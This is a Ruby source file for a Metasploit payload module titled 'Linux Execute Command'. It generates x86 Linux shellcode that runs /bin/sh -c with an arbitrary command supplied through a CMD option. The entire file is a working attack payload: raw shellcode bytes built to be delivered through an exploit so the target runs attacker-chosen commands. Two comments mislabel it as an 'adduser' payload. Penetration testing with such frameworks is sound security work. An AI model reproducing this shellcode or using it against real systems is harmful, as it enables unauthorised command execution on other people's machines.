require 'msf/core'

module Msf
module Payloads
module Singles
module Linux
module X86

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Exec

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Execute Command',
			'Version'       => '$Revision$',
			'Description'   => 'Execute an arbitrary command',
			'Author'        => 'vlad902',
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86))

		# Register adduser options
		register_options(
			[
				OptString.new('CMD',  [ true,  "The command string to execute" ]),
			], Msf::Payloads::Singles::Linux::X86::Exec)
	end

	#
	# Dynamically builds the adduser payload based on the user's options.
	#
	def generate
		cmd     = datastore['CMD'] || ''
		payload =
			"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
			"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
			Rex::Arch::X86.call(cmd.length) + cmd + "\x00"     +
			"\x57\x53\x89\xe1\xcd\x80"
	end

end

end end end end end
